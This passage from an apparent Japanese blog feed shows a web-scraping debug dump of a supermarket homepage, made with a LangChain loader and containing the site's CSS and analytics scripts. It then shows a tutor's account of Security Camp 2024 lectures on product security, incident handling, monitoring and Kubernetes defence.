自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\\\\n\' +      \'スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。\\\\n\' +      \'神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。\\\\n\' +      \'.detail_footer{display: none;} @media screen and (max-width: 767px){\\\\n\' +      \'.detail_footer{ display: block; position: fixed; bottom: 0; width: 100%;\\\\n\' +      \'z-index: 20; } .detail_footer_con{ display: flex; justify-content: space-around;\\\\n\' +      \'align-items: flex-start; max-width: 400px; width: 97%; margin: 0 auto; }\\\\n\' +      \'.detail_footer_con a{ text-decoration: none; color: #fff; } .footer_btn{\\\\n\' +      \'background-color: #13a555; padding: 10px; border-radius: 10px 10px 0 0; width:\\\\n\' +      \'32%; font-size: 11px; color: #fff; display: flex; flex-direction: column;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#13a555; padding: 10px; border-radius: 10px 10px 0 0; width: 32%; font-size:\\\\n\' +      \'11px; color: #fff; display: flex; flex-direction: column; justify-content:\\\\n\' +      \'center; align-items: center; height: 55px; } .footer_btn p{ margin: 0; }\\\\n\' +      \'.footer_btn img{ margin-bottom: 5px; } .shop_img{ width: 24%; } .bargain_img{\\\\n\' +      \'width: 23%; } .pro_img{ width: 21%; } .to_img{ width: 22%; } .re_img{ width:\\\\n\' +      \'25%; } .footer_x, .footer_insta{ width: 13%; border-radius: 40px; } .footer_x{\\\\n\' +      \'background-color: #000; padding: 13px; } .footer_insta{ background-color:\\\\n\' +      \'#ff0069; padding: 12px; } .footer_btn, .footer_x, .footer_insta{ box-shadow: 1px\\\\n\' +      \'1px 4px 0 rgba(0, 0, 0, .5); } } 店舗検索 特売情報 ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品\\\\n\' +      \'国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品 国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み 商品開発事前チェック\\\\n\' +      \'現地工場チェック 品質安全検査 商品検証 FC加盟店募集 業務スーパー5つの強み 業務スーパーの特徴 オープンまでのプロセス 体制について 契約概要・加盟条件\\\\n\' +      \'物件・商品のご提案募集 お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針\\\\n\' +      \'〒675-0063兵庫県加古川市加古川町平野125番1 \xa92018-document.write(new Date().getFullYear());\\\\n\' +      \'Gyomu Super All Rights Reserved. footer small { display: block; text-align:\\\\n\' +      \'right; padding-right: 10px; margin: 0 3%; color: #fff; } @media (max-width:64em)\\\\n\' +      \'{ footer small { display: block; text-align: left; padding-right: 10px; margin:\\\\n\' +      \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_slide\', \'event_label\' : \'top_slide_\'+top_slide+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_slide\', {\'top_slide\' : top_slide}); }); $(\'.topics\').click(function() { var\\\\n\\" +      \\"page_url = $(\'.topics a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\'\\\\n\\" +      \\": \'topics_bnr\', \'event_label\' : \'topics_bnr_\'+page_url+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'topics_bnr\', {\'topics_bnr\' : page_url}); });\\\\n\\" +      \\"$(\'.top_recipe_bnr\').click(function(){ var top_recipe_bnr = $(\'.top_recipe_bnr\\\\n\\" +      \\"a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' : \'top_recipe_bnr\',\\\\n\\" +      \\"\'event_label\' : \'top_recipe_bnr_\'+top_recipe_bnr+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\',\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\', {\'event_category\' : \'gs_forum\',\\\\n\\" +      \\"\'event_label\' : \'gs_forum_\'+gs_forum+\'\'}); gtag(\'event\', \'gs_forum\', {\'gs_forum\'\\\\n\\" +      \\": gs_forum}); }); $(\'.information dt\').click(function(){ var news_title =\\\\n\\" +      \\"$(this).children(\'p\').text(); gtag(\'event\', \'click\', {\'event_category\' : \'news\',\\\\n\\" +      \\"\'event_label\' : \'news_\'+news_title+\'\'}); gtag(\'event\', \'news\', {\'news\' :\\\\n\\" +      \\"news_title}); }); $(\'.yasusa\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'yasusa_himitsu\', \'event_label\' : \'yasusa_himitsu\'});\\\\n\\" +      \\"gtag(\'event\', \'yasusa_himitsu\', {\'yasusa_himitsu\' : \'yasusa_himitsu\'}); });\\\\n\\" +      \\"$(\'.anzen\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'anzen_himitsu\', \'event_label\' : \'anzen_himitsu\'}); gtag(\'event\',\\\\n\\" +      \\"\'anzen_himitsu\', {\'anzen_himitsu\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'anzen_himitsu\', \'event_label\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); gtag(\'event\', \'anzen_himitsu\', {\'anzen_himitsu\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); }); $(\'.recipe_btm_link\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'recipe_btm_link\', \'event_label\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); gtag(\'event\', \'recipe_btm_link\', {\'recipe_btm_link\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); }); $(\'.3step_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'3step_btn\', \'event_label\' : \'3step_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'3step_btn\', {\'3step_btn\' : \'3step_btn\'}); });\\\\n\\" +      \\"$(\'.setsuyaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'setsuyaku_btn\', \'event_label\' : \'setsuyaku_btn\'}); gtag(\'event\',\\\\n\\" +      \\"\'setsuyaku_btn\', {\'setsuyaku_btn\' : \'setsuyaku_btn\'}); });\\\\n\\" +      \\"$(\'.quick_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'quick_btn\', \'event_label\' : \'quick_btn\'}); gtag(\'event\', \'quick_btn\',\\\\n\\" +      \\"{\'quick_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'setsuyaku_btn\'}); }); $(\'.quick_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'quick_btn\', \'event_label\' : \'quick_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'quick_btn\', {\'quick_btn\' : \'quick_btn\'}); });\\\\n\\" +      \\"$(\'.honkaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'honkaku_btn\', \'event_label\' : \'honkaku_btn\'}); gtag(\'event\', \'honkaku_btn\',\\\\n\\" +      \\"{\'honkaku_btn\' : \'honkaku_btn\'}); }); $(\'.recipe_item\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'recipe_item\', \'event_label\' :\\\\n\\" +      \\"\'recipe_item\'}); gtag(\'event\', \'recipe_item\', {\'recipe_item\' : \'recipe_item\'});\\\\n\\" +      \\"}); $(\'.all_recipe_btn\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'all_recipe_btn\', \'event_label\' : \'all_recipe_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'all_recipe_btn\', {\'all_recipe_btn\' : \'all_recipe_btn\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_left\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'Visseel\', \'event_label\' : \'Visseel\'}); gtag(\'event\',\\\\n\\" +      \\"\'Visseel\', {\'Visseel\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'all_recipe_btn\'}); }); $(\'.sports_wrap .bun_left\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'Visseel\', \'event_label\' :\\\\n\\" +      \\"\'Visseel\'}); gtag(\'event\', \'Visseel\', {\'Visseel\' : \'Visseel\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_right\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'DeNA\', \'event_label\' : \'DeNA\'}); gtag(\'event\', \'DeNA\',\\\\n\\" +      \\"{\'DeNA\' : \'DeNA\'}); }); $(\'.sale_bnr\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'sale_bnr_mini\', \'event_label\' : \'sale_bnr_mini\'});\\\\n\\" +      \\"gtag(\'event\', \'sale_bnr_mini\', {\'sale_bnr_mini\' : \'sale_bnr_mini\'}); });\\\\n\\" +      \\"$(\'.top_ec_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_ec_btn\', \'event_label\' : \'top_ec_btn\'}); gtag(\'event\', \'top_ec_btn\',\\\\n\\" +      \\"{\'top_ec_btn\' : \'top_ec_btn\'}); }); $(\'.top_halal_btn\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\\\n\\" +      \\"\'top_halal_btn\'}); }); $(\'.gyomuca_slide\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'gyomuca_slide\', \'event_label\' : \'gyomuca_slide\'});\\\\n\\" +      \\"gtag(\'event\', \'gyomuca_slide\', {\'gyomuca_slide\' : \'gyomuca_slide\'}); });\\\\n\\" +      \\"$(\'.gyomuca_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'gyomuca_btn\', \'event_label\' : \'gyomuca_btn\'}); gtag(\'event\', \'gyomuca_btn\',\\\\n\\" +      \\"{\'gyomuca_btn\' : \'gyomuca_btn\'}); }); $(\'.top_shop_bnr a\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_shop_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); gtag(\'event\', \'top_shop_bnr\', {\'top_shop_bnr\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); }); $(\'.top_bargain_bnr a\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'top_bargain_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_bargain_bnr\'}); gtag(\'event\', \'top_bargain_bnr\', {\'top_bargain_bnr\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"a\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_bargain_bnr\', \'event_label\' : \'top_bargain_bnr\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_bargain_bnr\', {\'top_bargain_bnr\' : \'top_bargain_bnr\'}); });\\\\n\\" +      \\"$(document).ready(function() { $(\'.drawer\').drawer(); }); //infoaccordion\\\\n\\" +      `$(function(){ $(\\".infoac dt\\").not(\'#noicon\').on(\\"click\\", function() {\\\\n` +      \'$(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); }); }); //scroll\\\\n\' +      `$(function(){ // #で始まるリンクをクリックしたら実行されます $(\'a[href^=\\"#\\"]\').click(function() { //\\\\n` +      \'スクロールの速度 var speed = 600; // ミリ秒で記述 var href= $(this).attr(\\"href\\"); var target =\\\\n\' +      `$(href == \\"#\\" || href == \\"\\" ? \'html\' : href); var position =\\\\n` +      \\"target.offset().top; $(\'body,html\').animate({scrollTop:position}, speed,\\\\n\\" +      \\"\'swing\'); return false; }); }); //matchHeight $(function(){\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"var position = target.offset().top; $(\'body,html\').animate({scrollTop:position},\\\\n\\" +      \\"speed, \'swing\'); return false; }); }); //matchHeight $(function(){\\\\n\\" +      \\"$(\'.mh\').matchHeight(); }); function news_link(id,year) {\\\\n\\" +      \'document.newslink.ne_id.value=id; document.newslink.ne_year.value=year;\\\\n\' +      \'document.newslink.submit(); } $(function(){ $(\\"#acMenu dt\\").on(\\"click\\",\\\\n\' +      \'function() { $(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); });\\\\n\' +      \'}); $(\\".information dl dt\\\\n\' +      `p:contains(\'「酒類の品目等の表示義務」改正に伴う「麦旨」の品目表示及び税率適用区分表示の変更について\')\\").find(\'a\').attr({target:\\"_blank\\"});\\\\n` +      \'objectFitImages();\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  }]CheerioWebBaseLoaderはbodyタグ内を読むのですが、styleタグやscriptタグが入ってしまっているからなんですね。そこで、CheerioWebBaseLoaderを使わず、URLからfetchして、cheerioTextで得たbodyタグの中からstyleタグやscriptタグの中身を除去したコードを実行。npx ts-node webLoad.ts https://www.gyomusuper.jp/綺麗に取れました！！bodyContent:お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針ホーム商品紹介ミラクルレシピ特集一覧安心安全の取り組み業務スーパーとはGyomucaお問い合わせオンラインショップFC加盟店募集会社案内日本語/ENGLISH/中文NEWITEM新着商品新着ホット＆スパイシーヌードルホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。詳しくはこちら詳しくはこちらPICKUP!おすすめ商品商品をもっと見る新着パルメザンチーズのリゾットイタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！詳しくはこちらパルメザンチーズ[要冷蔵]詳しくはこちらPICKUP!おすすめレシピレシピをもっと見るSPECIALTOPICS特集特集をもっと見るSNS公式Instagram・公式X（旧Twitter）TweetsbyGyomusuperOFCL公式Instagram公式X（旧Twitter）2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。一覧を見る『世界の本物』を直輸入！業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！安さの秘密自慢の国内自社工場の『オリジナル』国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！安全・安心の秘密スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。店舗検索特売情報ホームWEBチラシ店舗案内ミラクルレシピ商品紹介直輸入商品国内自社工場商品業務スーパーとは安さの秘密安全安心の取り組み商品開発事前チェック現地工場チェック品質安全検査商品検証FC加盟店募集業務スーパー5つの強み業務スーパーの特徴オープンまでのプロセス体制について契約概要・加盟条件物件・商品のご提案募集お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針〒675-0063兵庫県加古川市加古川町平野125番1\xa92018-GyomuSuperAllRightsReserved.","isoDate":"2024-08-31T13:34:16.000Z","dateMiliSeconds":1725111256000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"セキュリティ・キャンプ 2024 参加記","link":"https://moz-security.hatenablog.com/entry/2024/08/31/121836","contentSnippet":"8月12日から8月16日までの5日間で開催されたセキュリティ・キャンプ2024 全国大会のBクラス（プロダクトセキュリティ）にチューターとして参加したので、体験記を書き残す。昨年、Bクラス（当時は、Webセキュリティ）を修了し、今年チューターとして、もう一度セキュリティ・キャンプに参加することになった。昨年の参加記は、以下である。今読み返してみると、次はネクスト受講生かチューターで参加したいということを書いており、今年チューターとして参加できたのはとてもよかった。moz-security.hatenablog.com日程表Bクラスの日程は、このような感じだった。6つの専門講義があり、それに加えて共通講義やグループワーク, 特別講演などがあり、毎日8:30~21:00に稼働するというハードスケジュールとなっている。セキュリティ・キャンプ Bクラス スケジュール共通講義、グループワーク共通講義では、ゲームセキュリティや法律、人の心理・行動特性についての講義があった。また、毎日グループワークの時間が30分あり、1グループ4人構成でセキュリティ教育について話しあっていた。コンピュータを全く知らない主婦や子供からコンピュータサイエンスをある程度学んだ学生などさまざまなターゲットに対して、いろいろなアプローチでセキュリティ技術を伝えようとするアイデアがあり、ディスカッションや最終発表を見ていてとてもおもしろかった。専門講義Bクラスでは、プロダクト開発におけるセキュリティをテーマにして、講義が構成されていた。全て４時間の講義で、座学と演習の両方を行う形式になっている。1日目のホームルームでプロデューサーから、講義設計にあたり未知との遭遇の最大化を目標としている旨を伝えられた。知らないこともたくさん出てくるだろうが、「アウトプットを行う→フィードバックを得る→新たな知らないことが生まれる」のループを回すことをセキュリティキャンプを通じて、また、セキュリティキャンプが終わった後も行うことが大事だということを話されていた。また、技術の話だけでなくお金の話も講義に盛り込むようにしており、コストとセキュリティのバランスを見定めるといった、より社会で行われていることを体感して、社会に出た後に活躍してほしいというお話があった。そういう意味で、プロデューサーがBクラスは社会人クラスと言っていたのもおもしろかった。これら２つのことは、講義を全て終えた今、改めてとてもプロデューサーの講義設計に対する意図や思いを感じている。2日目B1: プロダクトセキュリティの展望セキュリティ・キャンプ2024 全国大会 B1 プロダクトセキュリティの展望(#seccamp2024) | ドクセル\\"プロダクトセキュリティの展望\\" では、プロダクトの定義とそれが指す範囲の広さ、非機能要件であるセキュリティと組織としての向き合い方について学んだ。なかでも、社会と技術と資産を面で見れるようになるとセキュリティを俯瞰して見ること・考えることができ、面で見れるようになるためには、社会の変化に敏感になることが重要であるということはとても記憶に残っている。セキュリティを仕事にする上で新技術の把握や継続的な学習は大事だと言われているが、この講義を通して再認識させられた。また、プロダクトの価値を早く・大きく・継続して届けるための技術についても学んだ。これらはお金が密接に絡んでくる点で経営側の視点も必要であり、今まで考えたことがなかったが、組織で自分が影響力を発揮していくためには押さえておく必要はあるし、今後勉強していきたいと思った。最後に、組織規模に応じたセキュリティ対策について学んだ。セキュリティ対策が必要だといっても実際に行うには導入・運用にコストがかかるため、コストとセキュリティのバランスが必要となってくるし、その判断が難しいのはよく言われているためすでにわかっていた。しかし、ではどれくらいの組織規模に対してどのような対策を行うのかということは今まであまり考えたことなく（学生で考える人はあまりいないと思っているが）、グループディスカッションや発表、講師以外の方のお話なども含めてとても学びになった。いろんな会社のいろんな役職の人たちがいるのもセキュリティ・キャンプのよさであると思う。B-2: 情報セキュリティ戦略戦術ワークショップ\\"情報セキュリティ戦略戦術ワークショップ\\" では、組織のセキュリティ対策の進め方やインシデントハンドリングについて学んだ。この講義でも、やはり組織規模に応じたセキュリティ対策についてのお話はあり、やらないといけないことはたくさんあるがどれから取り組むかを考えるといったときに、ベストプラクティスやガイドライン、フレームワークは非常に参考になることがわかった。また、インシデント対応において、まず気付ける仕組みと改善の実施が重要であることがわかった。たしかにログが残っていたり、インシデント発生時にアラートが出なかったりすると、そもそもインシデントに気付けない。そのため、セキュリティ担当でなかったとしても、インシデントに気付くために一開発者としてどのような情報（ログ, メトリクス, アラート）が必要なのかは考えるようにしたいと思った。演習では、受講生がグループでインシデントハンドリングを体験しており、チューターとしてはチャットツールでの関係者とのやり取りを見ていた。インシデントというと私は外部の攻撃者からのサイバー攻撃を想像してしまうが、それだけではない。メールの誤送信などといったオペレーションミスや部署間での情報共有の不足、内部不正なども、ちゃんとインシデントであり、それも意外と発生してしまうことがあることを学んだ。演習で関係者とのやりとりがなかなかうまくいかず、大変そうだったのはとても記憶に残っている（覚えるべきとこはそこじゃないw）。3日目B-3: セキュリティ監視入門セキュリティ監視入門 | Notion\\"セキュリティ監視入門\\" では、監視の重要性と監視アーキテクチャの設計・構築について学んだ。監視をする上で最も重要で、最初に考えなければいけないのはなぜ監視するのか・何のために監視するのかであり、そこが曖昧であると例え監視を行っていて異常を見つけたり、アラートが出たりしても、その後の対応に繋がらないということはとても頭に残っている。この講義でもB-1に引き続いて、組織規模に応じた監視アーキテクチャの構築やSOCやCSIRTといった組織の構築を学んだ。どれだけのコストをセキュリティ対策にかけるかは経営判断だが、現場で何が行われているのかやどのようなデータがどこに存在しているかは把握していなければ、セキュリティ監視を行うことやそれにかかるコストを見積もることはできない。ログの対象となるデータは無限と言っていいほど存在しており、どのログを取るのかとコストのバランスを考えることがセキュリティ担当者としての腕の見せ所であることがわかった。また、セキュリティ監視において大規模な運用が始まると不可逆性はかなり高いことも学んだ。これは、データ移行が大変になるからという理由だったが、私自身今までトライアンドエラーを繰り返すことをよしとしていたため、セキュリティ監視というケースではそれがあまりふさわしくないこともあることがわかった。B-4: モダンなプロダクト開発を攻撃者の視点で捉える\\"モダンなプロダクト開発を攻撃者の視点で捉える\\" では、攻撃者がどうやって組織に対して攻撃を行うのかについて学んだのちに、それにやられないために防御側はどのような対策が必要なのかということを考えた。講義を通して、攻撃側と防御側の両方の視点でセキュリティを考えることができたのは非常に学びになった。なかでも、攻撃者はフロー（グラフ）で考え、防御側はリストで考えるというのはとても記憶に残っている。攻撃側は一点だけでも突破できればいいのに対して、防御側は全てを守らなければならない。加えて、多層防御を行い、全てを守っていると思っていても、攻撃者は全く思わぬところからクリティカルな攻撃を行うかもしれない（VPNの脆弱性を突いて初期侵入とかではなく、物理的に侵入するとか）。そのため、セキュリティ担当者として組織を守るには、ベストプラクティスやガイドラインを参考にしつつ、明確なWhyを持ったセキュリティ対策を取るように意識することが重要になってくるとわかった。ゼロトラストやDevSecOpsといった新しく出てきたワードに縛られないようにすることも重要であり、それもWhyを意識することで具体的なセキュリティ対策の実現という本質的な部分に焦点を当てることができることを学んだ。大学や勉強会では防御について学んだり考えたりすることが多いが、攻撃側の視点を養うためにも、もっとHack The Boxを頑張ろうと思う。4日目B-5: 設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\"設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\" では、プロダクト開発において考慮すべきセキュリティと実践方法について学んだ。プロダクトをセキュアにするというと、実装する際に脆弱性を作らないよう気をつけたりリリース前に脆弱性診断を行ったりすることを私はイメージする。しかし、要件定義・設計・実装の段階にテスト工程を前倒しにするというShift-leftの理解と実践により、開発工程の早い段階で脆弱性の検出を行うことが重要であることがわかった。ただ、早い段階で脆弱性を発見しようとするとやらないといけないことが大量に増えるため、できるだけ自動化して、人でないとできない箇所に開発者が注力できる仕組みを作ることが大事だと学んだ。セキュリティに携わるものとして、意識改革やセキュリティ教育ももちろん大事だが、技術者である以上、仕組みで解決できないかという視点は大事だと思う。脆弱性を自動で発見する方法としてはSASTやDASTというものがあり、これらのツールを使ってスキャンを行うことを学んだ。これをCI/CDのパイプラインに組み込むことで、例えば、マージされたタイミングでSASTを行い、ステージング環境にデプロイしたタイミングでDASTを行うといったことができる。これにより、仮に開発者に全くセキュリティの知識がなくても、ある程度のセキュリティは担保することができることがわかった。B-6: クラウドネイティブなシステムを保護するための実践的KubernetesセキュリティGitHub - kyohmizu/seccamp2024-B6\\"クラウドネイティブなシステムを保護するための実践的Kubernetesセキュリティ\\" では、Kubernetesとは何かということととコンテナやKubernetesに対する脅威・セキュリティ対策について学んだ。なかでも、3章の攻撃シナリオを学び、実際に演習したことは記憶に残っている。Kubernetesやコンテナに対する攻撃手法として、コンテナブレイクアウトや認証情報の窃取があることはすでに知っていたが、それ単体で攻撃として成り立つわけではなく、攻撃の中の一工程に過ぎない。そのため、演習を通して、OSコマンドインジェクションの脆弱性を突いた後、徐々に範囲を拡大していき、最終的にKubernetesクラスタのAdmin権限取得まで行うとという経験ができたのはよかった。Kubernetesに対する脅威を身にしみて実感できたし、攻撃者が範囲を拡大していく（ラテラルムーブメント）どこか一箇所でも防ぐことができればここまでやられなかったかもしれないといった防御視点でも考えることができた。講義全体を通して昨年に引き続き、B-1からB-6まで非常に幅広い分野の講義があった。どの講義も講師の方が4時間で終わるか怪しいと講義前から言うほどのボリュームになっており、チューターとして参加しながらも、全てを理解できているわけではない。また、講義の位置付けとしては一応入門となっているし、講義資料には大量のリンクが貼ってある。これは、もっと勉強することはあるよというメッセージ？だろう。勉強するための足がかりも与えられた今、これらを活用して、今後さらに勉強していきたいと思う。また、どの講義でもコストとセキュリティについて取り上げられており、組織の中でセキュリティ対策を進めていこうと思うとコストとセキュリティを見定める能力（費用対効果を考える能力）は求められることを強く実感した。チューターとして立ち位置としては講師と受講生の間となるため、セキュリティ・キャンプ全体を通して、昨年よりもいろんな人といろんな話をすることができた気がする。今思い返すと、受講生として参加した昨年は講義に食らいつくのに必死だったし、自分のスキルに自信もなく、講師の方にも積極的に話を聞きにいこうとしていなかった。今年はチューターとして講